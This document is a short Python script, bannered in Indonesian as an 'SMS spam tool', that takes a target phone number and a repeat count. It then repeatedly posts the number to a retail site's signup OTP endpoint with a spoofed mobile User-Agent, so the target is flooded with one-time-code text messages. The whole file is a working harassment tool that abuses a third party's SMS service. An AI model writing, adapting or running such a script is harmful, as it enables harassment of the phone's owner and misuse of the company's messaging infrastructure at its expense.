import os,sys,time,requests
from requests import post
import subprocess

def bersih ():
       os.system("clear ")

def lagi():
       f = input("coba lagi? (y/t):")
       if f == "y":
           subprocess.call("python Sms.py",shell=True)
       elif f == "t":
              print ("exit")
              sys.exit()

bersih()
banner = """
•============================•
Ini Tools SpamSms
  [-] Author : Ammar
  [-] yt     : Ammar B.N
  [-] my no  : 877087733**
•============================•
"""
print (banner)
no = input("Masukkan Nomor Target: ")
jl = int(input("Masukkan Jumlah Spam : "))
head = {
"connection": "keep alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKitAppleWebKit/537.36",}

dat = {
"phone": no,
}
for i in range(jl):
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp",data=dat, headers=head)
    print ("status:", r.json())
lagi()
exit
